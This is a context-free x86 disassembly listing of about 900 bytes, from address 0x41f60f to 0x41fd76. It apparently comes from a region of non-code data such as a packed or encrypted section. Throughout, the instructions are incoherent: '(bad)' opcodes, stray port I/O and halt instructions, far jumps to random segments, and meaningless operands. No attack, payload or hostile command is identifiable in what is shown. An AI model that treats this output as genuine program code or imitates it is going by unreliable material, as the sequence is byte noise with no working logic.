  41f60f:	jle    0x41f5d2
  41f611:	inc    ebp
  41f612:	adc    eax,0x9fd1f500
  41f617:	sbb    al,BYTE PTR [edi-0x41]
  41f61a:	or     edx,edx
  41f61c:	push   cs
  41f61d:	mov    ds:0x142ff72b,al
  41f622:	adc    al,0x37
  41f624:	mov    dl,dl
  41f626:	sbb    DWORD PTR [edi+0x72b3924d],esp
  41f62c:	and    ecx,0x77
  41f62f:	int3   
  41f630:	pop    esp
  41f631:	adc    ch,BYTE PTR [ecx]
  41f633:	fsubr  st(7),st
  41f635:	pop    esi
  41f636:	dec    eax
  41f637:	pop    eax
  41f638:	xor    ah,BYTE PTR [esi+0x70246f98]
  41f63e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f63f:	ret    
  41f640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f641:	push   es
  41f642:	sub    al,0xa9
  41f644:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f646:	add    ebp,edi
  41f648:	lods   eax,DWORD PTR ds:[esi]
  41f649:	dec    ebp
  41f64a:	mov    BYTE PTR [esi-0xa131da9],bh
  41f650:	sti    
  41f651:	repnz in al,dx
  41f653:	sbb    al,0x1
  41f655:	daa    
  41f656:	mov    ebx,0x93714b43
  41f65b:	or     dl,dl
  41f65d:	call   0x5e3f:0x5909dc95
  41f664:	stos   DWORD PTR es:[edi],eax
  41f665:	popf   
  41f666:	inc    esi
  41f667:	cwde   
  41f668:	mov    fs,WORD PTR [ebp+esi*2+0xc3990eb]
  41f66f:	xor    edx,DWORD PTR [ecx-0x60]
  41f672:	xchg   esp,eax
  41f673:	scas   al,BYTE PTR es:[edi]
  41f674:	enter  0x2e14,0x79
  41f678:	mov    eax,ds:0x8918e43a
  41f67d:	cli    
  41f67e:	inc    edx
  41f67f:	js     0x41f66d
  41f681:	pop    edi
  41f682:	sti    
  41f683:	xchg   DWORD PTR [ebx],ebp
  41f685:	adc    DWORD PTR [ebx-0x1c],ebx
  41f688:	mov    ds:0x53c06a7f,eax
  41f68d:	jb     0x41f626
  41f68f:	cli    
  41f690:	mov    ds:0x60cad10d,al
  41f695:	in     al,dx
  41f696:	dec    ecx
  41f697:	or     cl,BYTE PTR [esi]
  41f699:	inc    edx
  41f69a:	test   DWORD PTR [edi+0x9],eax
  41f69d:	cwde   
  41f69e:	test   eax,0x392deb95
  41f6a3:	adc    eax,0x16769a49
  41f6a8:	xchg   DWORD PTR [edx],esp
  41f6aa:	or     edx,esi
  41f6ac:	sub    al,0x5
  41f6ae:	fld    st(4)
  41f6b0:	dec    esp
  41f6b1:	loopne 0x41f63d
  41f6b3:	aas    
  41f6b4:	fdivr  st(5),st
  41f6b6:	fidiv  DWORD PTR [ebx-0x36]
  41f6b9:	es xchg esi,eax
  41f6bb:	inc    ebx
  41f6bc:	fsincos 
  41f6be:	cmp    DWORD PTR [edx+0x1c524bac],esp
  41f6c4:	or     eax,0x13451910
  41f6c9:	fadd   QWORD PTR [edi+0x245cd3a9]
  41f6cf:	icebp  
  41f6d0:	add    al,cl
  41f6d2:	push   0xfb5a03c5
  41f6d7:	jecxz  0x41f710
  41f6d9:	aas    
  41f6da:	ss pushf 
  41f6dc:	ret    
  41f6dd:	dec    esp
  41f6de:	popa   
  41f6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6e0:	push   edx
  41f6e1:	aas    
  41f6e2:	das    
  41f6e3:	mov    eax,ds:0x67a06af
  41f6e8:	rcr    BYTE PTR [eax],1
  41f6ea:	pop    es
  41f6eb:	(bad)  
  41f6ec:	popa   
  41f6ed:	shr    edi,1
  41f6ef:	pop    ds
  41f6f0:	scas   eax,DWORD PTR es:[edi]
  41f6f1:	leave  
  41f6f2:	test   eax,0x3f984f65
  41f6f7:	stos   BYTE PTR es:[edi],al
  41f6f8:	das    
  41f6f9:	inc    edi
  41f6fa:	sbb    al,0xe
  41f6fc:	add    eax,0xa51c6cf6
  41f701:	mov    ecx,0xe73f05fb
  41f706:	scas   al,BYTE PTR es:[edi]
  41f707:	shl    bh,cl
  41f709:	jp     0x41f740
  41f70b:	fisub  WORD PTR [ecx+0x1aa6d7ce]
  41f711:	mov    ds:0x6d32f452,al
  41f716:	mov    ds:0x329d26f5,al
  41f71b:	mov    WORD PTR es:[edi],?
  41f71e:	cmp    al,BYTE PTR [eax-0x78]
  41f721:	xlat   BYTE PTR ds:[ebx]
  41f722:	int3   
  41f723:	and    BYTE PTR [eax-0x4dbad2f7],dh
  41f729:	test   al,0xa8
  41f72b:	inc    edx
  41f72c:	dec    edx
  41f72d:	dec    esp
  41f72f:	xchg   esi,eax
  41f730:	jb     0x41f720
  41f732:	dec    edi
  41f733:	stos   BYTE PTR es:[edi],al
  41f734:	cwde   
  41f735:	jmp    0x6f7a:0xcbff81d4
  41f73c:	imul   ecx,DWORD PTR [eax+0x60cf1490],0x6f
  41f743:	fs mov dh,0xb
  41f746:	inc    ecx
  41f747:	scas   al,BYTE PTR es:[edi]
  41f748:	mov    gs,WORD PTR [esi+edx*1+0x1822841e]
  41f74f:	cmp    BYTE PTR [ecx],al
  41f751:	fnstenv [eax+0x757456fe]
  41f757:	hlt    
  41f758:	fst    QWORD PTR [ebx]
  41f75a:	push   esi
  41f75b:	add    al,BYTE PTR [ecx+0x4e054339]
  41f761:	dec    esi
  41f762:	mov    ah,0xea
  41f764:	push   ss
  41f765:	rol    DWORD PTR [ebx+0x7241fbce],0x33
  41f76c:	cli    
  41f76d:	loope  0x41f700
  41f76f:	mov    bh,0x26
  41f771:	test   BYTE PTR [edx],bl
  41f773:	iret   
  41f774:	add    ch,BYTE PTR [edx+edi*4+0x5f16f4ca]
  41f77b:	test   al,dl
  41f77d:	inc    eax
  41f77e:	mov    ch,0xe4
  41f780:	push   cs
  41f781:	push   ebx
  41f782:	add    eax,0x217ea6ff
  41f787:	push   ebx
  41f788:	inc    ebx
  41f789:	push   ss
  41f78a:	sub    al,0x74
  41f78c:	scas   al,BYTE PTR es:[edi]
  41f78d:	jmp    0x72279af5
  41f792:	arpl   WORD PTR [eax-0x52],sp
  41f795:	outs   dx,BYTE PTR ds:[esi]
  41f796:	jne    0x41f78a
  41f798:	pop    ecx
  41f799:	jnp    0x41f7e0
  41f79b:	push   cs
  41f79c:	sbb    BYTE PTR [edx],cl
  41f79e:	in     eax,dx
  41f79f:	(bad)  
  41f7a0:	jo     0x41f7c6
  41f7a2:	loope  0x41f74c
  41f7a4:	sahf   
  41f7a5:	das    
  41f7a6:	cmp    eax,0x1fcdb3c1
  41f7ab:	outs   dx,BYTE PTR ds:[esi]
  41f7ac:	bound  eax,QWORD PTR [eax]
  41f7ae:	fidiv  DWORD PTR [ebx+0x2f]
  41f7b1:	sub    DWORD PTR [ebp+0x4e976023],esi
  41f7b7:	(bad)  
  41f7b8:	aas    
  41f7b9:	dec    esi
  41f7ba:	inc    eax
  41f7bb:	idiv   BYTE PTR [ecx-0x5f8afbe3]
  41f7c1:	pop    ebx
  41f7c2:	retf   0x75a7
  41f7c5:	fisttp DWORD PTR [ecx]
  41f7c7:	ror    DWORD PTR [ebx-0x44],1
  41f7ca:	cmp    bh,BYTE PTR [edx-0x130fce3]
  41f7d0:	neg    eax
  41f7d2:	xor    ecx,DWORD PTR [edi]
  41f7d4:	inc    esi
  41f7d5:	test   al,0x10
  41f7d7:	scas   eax,DWORD PTR es:[edi]
  41f7d8:	jmp    0x41f854
  41f7da:	test   eax,0xa00561f0
  41f7df:	xor    eax,0xeaeedcb4
  41f7e4:	int    0x9
  41f7e6:	dec    edx
  41f7e7:	(bad)  
  41f7e8:	mov    esi,0x7a9e8a82
  41f7ed:	lock (bad) 
  41f7ef:	gs hlt 
  41f7f1:	rcl    DWORD PTR [ecx],cl
  41f7f3:	pop    edx
  41f7f4:	stos   BYTE PTR es:[edi],al
  41f7f5:	sbb    eax,0x43568d77
  41f7fa:	jge    0x41f7da
  41f7fc:	ds jne 0x41f7b9
  41f7ff:	je     0x41f87a
  41f801:	or     eax,0xfe6740e2
  41f806:	sub    BYTE PTR [edi-0xc523e5d],dh
  41f80c:	jo     0x41f83b
  41f80e:	pop    edi
  41f80f:	idiv   DWORD PTR [esi-0x57d61d88]
  41f815:	fwait
  41f816:	push   eax
  41f817:	pop    ecx
  41f818:	(bad)  
  41f819:	cmp    BYTE PTR [edi-0x4e],cl
  41f81c:	dec    ebp
  41f81d:	ror    bl,0x1c
  41f820:	xchg   edx,eax
  41f821:	push   eax
  41f822:	dec    ecx
  41f823:	mov    eax,0x66c116e1
  41f828:	int    0x7
  41f82a:	je     0x41f83a
  41f82c:	test   esp,0xfd485ee8
  41f832:	sbb    eax,0xe6b37936
  41f837:	les    ecx,FWORD PTR [esi+0x65cade2a]
  41f83d:	sahf   
  41f83e:	mov    edi,0x9ab1966d
  41f843:	or     dh,BYTE PTR [edx]
  41f845:	mov    dh,0x59
  41f847:	imul   esi,DWORD PTR [ebp-0x2ad0a406],0x79
  41f84e:	leave  
  41f84f:	xchg   ebx,eax
  41f850:	fnstenv [ecx-0x4f127a7c]
  41f856:	es inc esi
  41f858:	push   cs
  41f859:	in     eax,dx
  41f85a:	ins    BYTE PTR es:[edi],dx
  41f85b:	sub    dl,bh
  41f85d:	ins    BYTE PTR es:[edi],dx
  41f85e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f85f:	inc    ecx
  41f860:	push   eax
  41f861:	xor    ebx,0x596b5705
  41f867:	mov    fs,WORD PTR [edx]
  41f869:	push   esp
  41f86a:	xor    edi,DWORD PTR [ebx+0x3447557a]
  41f870:	and    ch,BYTE PTR [ebx+0xfeb2682]
  41f876:	imul   edi,DWORD PTR ds:0x3a84c523,0x4d0188da
  41f880:	inc    ecx
  41f881:	mov    ebx,0xc244f2c2
  41f886:	(bad)  
  41f887:	in     al,dx
  41f888:	fbld   TBYTE PTR [ecx-0x5c]
  41f88b:	cs xchg edx,eax
  41f88d:	pop    esp
  41f88e:	mov    eax,0xf1244dbd
  41f893:	pop    edx
  41f894:	enter  0xc943,0xaf
  41f898:	jae    0x41f8bc
  41f89a:	dec    edi
  41f89b:	pop    ecx
  41f89c:	sub    eax,0x758598e3
  41f8a1:	jae    0x41f885
  41f8a3:	popa   
  41f8a4:	dec    edi
  41f8a5:	das    
  41f8a6:	xor    al,0x88
  41f8a8:	(bad)  
  41f8a9:	sub    eax,0xdd4f7501
  41f8ae:	fwait
  41f8af:	xor    ecx,DWORD PTR [ecx-0x7c6c969]
  41f8b5:	sar    DWORD PTR [ecx-0x6aebeaca],1
  41f8bb:	daa    
  41f8bc:	sbb    edi,0x5d
  41f8bf:	retf   
  41f8c0:	icebp  
  41f8c1:	and    eax,0x4fa02351
  41f8c6:	add    eax,0x4f08d8c
  41f8cb:	(bad)  
  41f8cd:	cmp    DWORD PTR [edx-0x20e1b408],ebp
  41f8d3:	cmp    BYTE PTR [eax],0x5a
  41f8d6:	dec    edx
  41f8d7:	pop    esi
  41f8d8:	mov    ah,0x87
  41f8da:	ss cdq 
  41f8dc:	jbe    0x41f92b
  41f8de:	add    al,0x40
  41f8e0:	(bad)  
  41f8e1:	fld    st(1)
  41f8e3:	mov    ebx,DWORD PTR [ecx-0x9efa4d4]
  41f8e9:	call   0xecaf:0xddc153ca
  41f8f0:	cmp    al,0x4f
  41f8f2:	and    ebp,ebp
  41f8f4:	and    BYTE PTR [edx],0xec
  41f8f7:	cli    
  41f8f8:	fst    QWORD PTR [edx+0x4bd202aa]
  41f8fe:	mov    ebp,0xaffd7ed5
  41f903:	or     bh,cl
  41f905:	inc    ecx
  41f906:	dec    edi
  41f907:	mov    dh,0xba
  41f909:	fadd   st,st(4)
  41f90b:	dec    edi
  41f90c:	retw   0x6682
  41f910:	mov    esi,0x9af733b
  41f915:	es xor esp,ebp
  41f918:	mov    al,ds:0x1b77a282
  41f91d:	sbb    DWORD PTR ds:0x5e6a3f3e,edi
  41f923:	popf   
  41f924:	rol    DWORD PTR [ecx],0x26
  41f927:	and    ebp,ecx
  41f929:	ss aad 0xde
  41f92c:	xor    ecx,ebx
  41f92e:	pop    ss
  41f92f:	mov    eax,edx
  41f931:	inc    ecx
  41f932:	dec    ebx
  41f933:	push   edx
  41f934:	sbb    DWORD PTR ss:[eax+0x51f4f701],esp
  41f93b:	pop    ss
  41f93c:	sub    ecx,DWORD PTR [edx-0x7e]
  41f93f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f940:	sahf   
  41f941:	rol    dh,1
  41f943:	(bad)  
  41f944:	xor    ebp,DWORD PTR [ecx-0x19]
  41f947:	ss xchg esi,eax
  41f949:	xor    edx,eax
  41f94b:	mov    fs,WORD PTR [ebx+0x3b]
  41f94e:	out    0x15,al
  41f950:	xor    ecx,ebp
  41f952:	sbb    DWORD PTR [ebx-0x67],eax
  41f955:	fdiv   st,st(7)
  41f957:	in     al,dx
  41f958:	jecxz  0x41f94c
  41f95a:	mov    al,0x95
  41f95c:	hlt    
  41f95d:	enter  0xd685,0xc1
  41f961:	xchg   ebp,eax
  41f962:	call   0xe036328
  41f967:	adc    BYTE PTR [ebp-0x23],cl
  41f96a:	fucomi st,st(6)
  41f96c:	andnps xmm4,XMMWORD PTR [ecx-0x11]
  41f970:	test   al,0xd7
  41f972:	pop    ecx
  41f973:	shl    dl,1
  41f975:	pop    esi
  41f976:	xlat   BYTE PTR ds:[ebx]
  41f977:	sub    esp,DWORD PTR [esi]
  41f979:	dec    edi
  41f97a:	sbb    bl,0xbf
  41f97d:	inc    edx
  41f97e:	stos   DWORD PTR es:[edi],eax
  41f97f:	mov    bh,0xf6
  41f981:	push   ss
  41f982:	cmp    eax,0x20eae740
  41f987:	fld    TBYTE PTR [edx-0x63aa4822]
  41f98d:	cmp    cl,dh
  41f98f:	pop    ds
  41f990:	outs   dx,BYTE PTR ds:[esi]
  41f991:	cmp    eax,0xa36d82bd
  41f996:	(bad)  
  41f998:	sub    edx,DWORD PTR [eax+0x2dae457c]
  41f99e:	fadd   QWORD PTR [ecx-0x2230c40]
  41f9a4:	xchg   DWORD PTR ds:0x21d0aacb,esi
  41f9aa:	cmp    BYTE PTR [ebx-0x3930245e],0xb8
  41f9b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9b2:	mov    edx,0xe4bedb8d
  41f9b7:	pushf  
  41f9b8:	or     al,0x70
  41f9ba:	cmp    eax,0xa923d4a3
  41f9bf:	cdq    
  41f9c0:	cmp    al,0xa0
  41f9c2:	loope  0x41fa0c
  41f9c4:	ss and eax,0xee3896a1
  41f9ca:	fcomp  QWORD PTR [edx-0x429df97]
  41f9d0:	pop    edx
  41f9d1:	mov    esi,0xa35b1718
  41f9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9d7:	addr16 push ss
  41f9d9:	sub    al,0x93
  41f9db:	and    ah,BYTE PTR [edx]
  41f9dd:	cmc    
  41f9de:	cdq    
  41f9df:	sub    DWORD PTR [ebp+0x2fd372a4],0x13
  41f9e6:	out    0xe6,al
  41f9e8:	inc    ebx
  41f9e9:	aam    0xb
  41f9eb:	repnz pop ecx
  41f9ed:	test   DWORD PTR [ebx],edx
  41f9ef:	fucomp st(2)
  41f9f1:	loopne 0x41f9ef
  41f9f3:	inc    esi
  41f9f4:	push   cs
  41f9f5:	pushf  
  41f9f6:	popa   
  41f9f7:	cmc    
  41f9f8:	outs   dx,BYTE PTR ds:[esi]
  41f9f9:	cmp    eax,0x4312c14e
  41f9fe:	sub    DWORD PTR [ebp-0x737f1e9d],esp
  41fa04:	xchg   esi,eax
  41fa05:	arpl   WORD PTR [ecx],dx
  41fa07:	or     DWORD PTR [edi],esi
  41fa09:	jmp    0x6ca671f0
  41fa0e:	aad    0xa8
  41fa10:	sbb    al,BYTE PTR [ebx]
  41fa12:	push   0x1b
  41fa14:	cwde   
  41fa15:	retf   
  41fa16:	aaa    
  41fa17:	sbb    BYTE PTR [eax],cl
  41fa19:	scas   eax,DWORD PTR es:[edi]
  41fa1a:	xor    eax,0x1c1323c8
  41fa1f:	in     al,dx
  41fa20:	mov    ?,ebx
  41fa22:	pop    ebp
  41fa23:	enter  0xff86,0x7b
  41fa27:	mov    edx,0x305cf616
  41fa2c:	shl    eax,cl
  41fa2e:	pop    esp
  41fa2f:	sub    al,0xc9
  41fa31:	mov    esi,DWORD PTR [edi-0x12]
  41fa34:	jmp    0x41fab0
  41fa36:	mov    ebx,0x7bb09e82
  41fa3b:	pop    ecx
  41fa3c:	sbb    DWORD PTR ds:0x8c29e9e6,eax
  41fa42:	sar    al,0xd9
  41fa45:	lds    eax,FWORD PTR [edi-0x4ec9019f]
  41fa4b:	ror    DWORD PTR [ebx+0x1f0e44a0],0x74
  41fa52:	(bad)  
  41fa53:	lods   al,BYTE PTR ds:[esi]
  41fa54:	xchg   esp,eax
  41fa55:	fistp  WORD PTR [ecx-0x703ee833]
  41fa5b:	cmc    
  41fa5c:	stc    
  41fa5d:	cmovno edx,DWORD PTR [edi+eax*8+0x6a5163f5]
  41fa65:	rol    DWORD PTR [ecx-0x1],1
  41fa68:	popf   
  41fa69:	loopne 0x41fabe
  41fa6b:	inc    esp
  41fa6c:	js     0x41fa01
  41fa6e:	pop    ecx
  41fa6f:	ja     0x41fa0e
  41fa71:	cmp    DWORD PTR [esi],edi
  41fa73:	mov    esi,0xf14f7aaa
  41fa78:	jbe    0x41faa6
  41fa7a:	push   es
  41fa7b:	dec    edx
  41fa7c:	sbb    al,0xfc
  41fa7e:	and    esi,DWORD PTR [ecx+0x55c7114a]
  41fa84:	jp     0x41faba
  41fa86:	ins    BYTE PTR es:[edi],dx
  41fa87:	add    eax,DWORD PTR [eax+edx*2+0x22]
  41fa8b:	test   al,0xd5
  41fa8d:	add    DWORD PTR [ebp-0x69],0x62
  41fa91:	push   eax
  41fa92:	sar    DWORD PTR ds:0x9e7ac9e6,cl
  41fa98:	or     eax,0xd2aacc02
  41fa9d:	das    
  41fa9e:	(bad)  
  41fa9f:	hlt    
  41faa0:	mov    DWORD PTR [eax+0x75585490],0x450bd303
  41faaa:	mov    bh,0x81
  41faac:	lea    edx,[esi+0x63f0347c]
  41fab2:	push   0x6c
  41fab4:	xchg   ecx,eax
  41fab5:	xchg   edx,eax
  41fab6:	fcom   DWORD PTR [eax-0x4c]
  41fab9:	cmp    al,0xc2
  41fabb:	cmp    BYTE PTR [ebp+0x5bffe10],0xcd
  41fac2:	inc    edi
  41fac3:	jg     0x41fad3
  41fac5:	jp     0x41faa2
  41fac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fac8:	jne    0x41fa68
  41faca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41facb:	add    BYTE PTR [edi-0x1a],ch
  41face:	dec    edi
  41facf:	mov    cl,BYTE PTR [ecx+0x66113bae]
  41fad5:	(bad)  
  41fad6:	mov    dl,0x76
  41fad8:	sbb    dl,BYTE PTR [eax-0x70cc1262]
  41fade:	mov    ebx,0xdb1394a0
  41fae3:	mov    ds:0x89ad133b,al
  41fae8:	mov    ds:0x29dc2ad5,eax
  41faed:	jnp    0x41fab1
  41faef:	add    ah,cl
  41faf1:	retf   0x1ef0
  41faf4:	out    0xbc,al
  41faf6:	ret    0x800d
  41faf9:	int    0xbb
  41fafb:	adc    DWORD PTR [eax+0x76],0xa2d08573
  41fb02:	inc    edi
  41fb03:	hlt    
  41fb04:	adc    al,0x98
  41fb06:	jmp    0x1ee7f3ef
  41fb0b:	pop    esi
  41fb0c:	sub    eax,0x908e9450
  41fb11:	fstp   TBYTE PTR [edi+0x3f]
  41fb14:	stos   DWORD PTR es:[edi],eax
  41fb15:	adc    al,0xb7
  41fb17:	or     BYTE PTR [esi],ah
  41fb19:	mov    WORD PTR [edx+0x19],cs
  41fb1c:	xchg   ebx,eax
  41fb1d:	and    cl,BYTE PTR [ecx]
  41fb1f:	not    BYTE PTR [esi]
  41fb21:	xor    eax,0xa650e4fd
  41fb26:	jmp    0xf729:0x911c679b
  41fb2d:	xlat   BYTE PTR ds:[ebx]
  41fb2e:	cmp    dl,dl
  41fb30:	jecxz  0x41fab5
  41fb32:	sahf   
  41fb33:	pop    esi
  41fb34:	dec    ebp
  41fb35:	inc    eax
  41fb36:	pop    eax
  41fb37:	hlt    
  41fb38:	ja     0x41fac6
  41fb3a:	les    edi,FWORD PTR ds:0xb6b1e469
  41fb40:	rol    DWORD PTR [ecx+eax*8],0xc9
  41fb44:	retf   
  41fb45:	outs   dx,DWORD PTR ds:[esi]
  41fb46:	call   0x8a79:0xdf09c0d1
  41fb4d:	adc    al,0x37
  41fb4f:	popf   
  41fb50:	fs out dx,eax
  41fb52:	mov    cl,0xc0
  41fb54:	push   edi
  41fb55:	imul   ebp,DWORD PTR [ebp+0x27fabac0],0x6f
  41fb5c:	mov    esp,0x78f4c9a5
  41fb61:	fbstp  TBYTE PTR [esi+edi*1]
  41fb64:	fcmovnb st,st(5)
  41fb66:	xchg   ebp,eax
  41fb67:	jmp    0xbb2f:0x946a1b73
  41fb6e:	inc    edi
  41fb6f:	hlt    
  41fb70:	(bad)  [ebx-0x57ed009]
  41fb76:	pop    DWORD PTR [ebx]
  41fb78:	fnsave [ebx-0x59]
  41fb7b:	fcomip st,st(7)
  41fb7d:	repnz and ebx,esi
  41fb80:	mov    bl,0x37
  41fb82:	xchg   edx,eax
  41fb83:	stos   DWORD PTR es:[edi],eax
  41fb84:	pop    ebx
  41fb85:	cmp    ebp,ebp
  41fb87:	loopne 0x41fbf3
  41fb89:	ror    BYTE PTR [edx-0x60],1
  41fb8c:	xor    DWORD PTR [esi],ecx
  41fb8e:	xlat   BYTE PTR ds:[ebx]
  41fb8f:	jmp    0x41fb8c
  41fb91:	jbe    0x41fb93
  41fb93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb94:	pop    DWORD PTR [ebx]
  41fb96:	cmp    BYTE PTR [edi+esi*1+0x40],bl
  41fb9a:	fcomp  DWORD PTR [ebx+0x20]
  41fb9d:	inc    ebp
  41fb9e:	popf   
  41fb9f:	in     eax,0x29
  41fba1:	cld    
  41fba2:	(bad)  
  41fba3:	or     eax,0x540e7709
  41fba8:	jnp    0x41fb38
  41fbaa:	das    
  41fbab:	fnstcw WORD PTR [esi+0x7db8805c]
  41fbb1:	pop    esp
  41fbb2:	cmp    bl,BYTE PTR [esi+0x778da4f0]
  41fbb8:	loope  0x41fbfd
  41fbba:	or     DWORD PTR [ebx+0x17],edx
  41fbbd:	sub    eax,0x3e4531f4
  41fbc2:	xor    DWORD PTR [esi],ebp
  41fbc4:	push   ss
  41fbc5:	mov    eax,0x8fbd57be
  41fbca:	mov    bh,0x4e
  41fbcc:	mov    bl,BYTE PTR [eax+0x4c]
  41fbcf:	inc    ebx
  41fbd0:	cmp    BYTE PTR [edi+0x544e089b],dh
  41fbd6:	lahf   
  41fbd7:	pop    eax
  41fbd8:	xchg   esp,eax
  41fbd9:	jecxz  0x41fc59
  41fbdb:	jo     0x41fc34
  41fbdd:	cmc    
  41fbde:	test   cl,al
  41fbe0:	pusha  
  41fbe1:	push   eax
  41fbe2:	jb     0x41fb65
  41fbe4:	cmp    DWORD PTR [esi+0x6b],ebx
  41fbe7:	sub    esi,DWORD PTR [edx-0x76bfeede]
  41fbed:	leave  
  41fbee:	cmp    eax,0xfc83aa52
  41fbf3:	or     DWORD PTR [edi+0x17f852b4],edx
  41fbf9:	and    al,0xa
  41fbfb:	or     ah,0x3
  41fbfe:	or     edi,ebp
  41fc00:	sub    eax,0xc5e9ab2b
  41fc05:	add    DWORD PTR [edx+0x4],ebx
  41fc08:	mov    bl,0xf5
  41fc0a:	in     al,0xac
  41fc0c:	(bad)  
  41fc0e:	test   DWORD PTR [ebx+0x623a1eb6],0x9c15ab67
  41fc18:	in     eax,dx
  41fc19:	xlat   BYTE PTR ds:[ebx]
  41fc1a:	and    cl,0x82
  41fc1d:	push   eax
  41fc1e:	add    al,0x9a
  41fc20:	xchg   BYTE PTR [eax-0x21979898],ch
  41fc26:	xor    al,0x38
  41fc28:	or     dh,cl
  41fc2a:	or     al,0x1d
  41fc2c:	push   ebp
  41fc2d:	int    0x61
  41fc2f:	cmc    
  41fc30:	dec    edx
  41fc31:	clc    
  41fc32:	mov    ebx,0xff4ad2e5
  41fc37:	aas    
  41fc38:	rcr    BYTE PTR [esi+0x27],cl
  41fc3b:	jl     0x41fc65
  41fc3d:	or     DWORD PTR fs:[ebp-0x325b397b],0x6
  41fc45:	xor    al,0x2c
  41fc47:	pop    esi
  41fc48:	adc    edi,DWORD PTR [edi]
  41fc4a:	inc    edx
  41fc4b:	cmp    ebx,DWORD PTR [ecx+0x470e891]
  41fc51:	icebp  
  41fc52:	aas    
  41fc53:	cmp    ch,al
  41fc55:	pop    ebx
  41fc56:	push   cs
  41fc57:	fst    QWORD PTR [eax+0x7032c599]
  41fc5d:	or     al,0xac
  41fc5f:	pop    ds
  41fc60:	add    bl,al
  41fc62:	push   edi
  41fc63:	pop    ss
  41fc64:	loope  0x41fc42
  41fc66:	add    DWORD PTR [ecx-0x7f],edi
  41fc69:	sub    ch,BYTE PTR [edi-0x4d]
  41fc6c:	add    dh,BYTE PTR [ebp-0x78]
  41fc6f:	jae    0x41fcd2
  41fc71:	enter  0xffff,0x41
  41fc75:	push   ebp
  41fc76:	nop
  41fc77:	pushf  
  41fc78:	dec    ebp
  41fc79:	jmp    0x41fcda
  41fc7b:	mov    cl,0x5b
  41fc7d:	sub    BYTE PTR [ecx-0x40498c9e],ah
  41fc83:	lods   eax,DWORD PTR ds:[esi]
  41fc84:	dec    edi
  41fc85:	aaa    
  41fc86:	mov    WORD PTR [ebx],fs
  41fc88:	pop    eax
  41fc89:	cs repz pop eax
  41fc8c:	out    dx,eax
  41fc8d:	arpl   WORD PTR [ecx+0x49b93d3b],sp
  41fc93:	in     eax,dx
  41fc94:	push   cs
  41fc95:	pop    edi
  41fc96:	jmp    0x2136:0xda0628a
  41fc9d:	jbe    0x41fc5b
  41fc9f:	push   ds
  41fca0:	test   esi,ebp
  41fca2:	adc    BYTE PTR [ebp+esi*1+0x25],bl
  41fca6:	std    
  41fca7:	test   BYTE PTR [ecx+0x7e5073b3],ch
  41fcad:	retf   0xd737
  41fcb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcb1:	pop    ebx
  41fcb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcb3:	mov    dh,0xdc
  41fcb5:	and    BYTE PTR [edi+0x35],0x1
  41fcb9:	loope  0x41fd35
  41fcbb:	mov    dh,0x3d
  41fcbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcbe:	clc    
  41fcbf:	data16 loop 0x41fccd
  41fcc2:	mov    al,ds:0x7cf53837
  41fcc7:	ficomp DWORD PTR [ebp-0x62]
  41fcca:	adc    al,BYTE PTR [edx]
  41fccc:	dec    ebp
  41fccd:	or     eax,esp
  41fccf:	popa   
  41fcd0:	cmc    
  41fcd1:	test   al,0x85
  41fcd3:	sbb    eax,0x5844ea2f
  41fcd8:	clc    
  41fcd9:	jb     0x41fcec
  41fcdb:	out    dx,al
  41fcdc:	xor    eax,0x51383d2a
  41fce1:	cmp    bh,bh
  41fce3:	jbe    0x41fd28
  41fce5:	inc    esp
  41fce6:	fisub  WORD PTR [ebx-0x30c338a4]
  41fcec:	fwait
  41fced:	imul   eax,DWORD PTR [ebp-0x2521f9e6],0x50b82c6a
  41fcf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcf8:	inc    esp
  41fcf9:	loopne 0x41fd22
  41fcfb:	mov    ecx,0x20b16f4a
  41fd00:	hlt    
  41fd01:	in     al,dx
  41fd02:	push   eax
  41fd03:	jns    0x41fcf2
  41fd05:	addr16 push ss
  41fd07:	mov    ebx,0xd99949e
  41fd0c:	and    bl,bl
  41fd0e:	(bad)  
  41fd0f:	daa    
  41fd10:	pusha  
  41fd11:	cmp    DWORD PTR [ebx-0x1f448fa6],ebp
  41fd17:	pusha  
  41fd18:	push   0xffffffff
  41fd1a:	fistp  WORD PTR [eax+0x1b2fae34]
  41fd20:	cli    
  41fd21:	jae    0x41fcff
  41fd23:	jmp    0x4327706b
  41fd28:	out    0xe3,eax
  41fd2a:	jecxz  0x41fceb
  41fd2c:	sbb    dh,ah
  41fd2e:	jmp    0x41fcb8
  41fd30:	push   edi
  41fd31:	aaa    
  41fd32:	jmp    0x83c03b9c
  41fd37:	mov    gs,WORD PTR [edi-0x3a46a1b2]
  41fd3d:	and    eax,0x4a6f7dc6
  41fd42:	add    cl,bl
  41fd44:	outs   dx,BYTE PTR ds:[esi]
  41fd45:	xor    al,0x84
  41fd47:	jmp    0x41fd2e
  41fd49:	jge    0x41fd7d
  41fd4b:	push   0xe0e7f5ff
  41fd50:	xor    ebp,eax
  41fd52:	jle    0x41fdae
  41fd54:	jnp    0x41fd9c
  41fd56:	jae    0x41fd5d
  41fd58:	out    dx,al
  41fd59:	pop    ebx
  41fd5a:	dec    edx
  41fd5b:	pop    ebx
  41fd5c:	test   al,0x22
  41fd5e:	dec    esp
  41fd5f:	and    al,0x1a
  41fd61:	xchg   ebp,eax
  41fd62:	adc    eax,0x34933e39
  41fd67:	inc    esp
  41fd68:	xchg   ebx,eax
  41fd69:	and    ch,al
  41fd6b:	cmovge ecx,DWORD PTR [esi-0x23]
  41fd6f:	outs   dx,BYTE PTR ds:[esi]
  41fd70:	push   ds
  41fd71:	daa    
  41fd72:	in     eax,dx
  41fd73:	es dec eax
  41fd75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd76:	call   0xa8b:0x669deaef
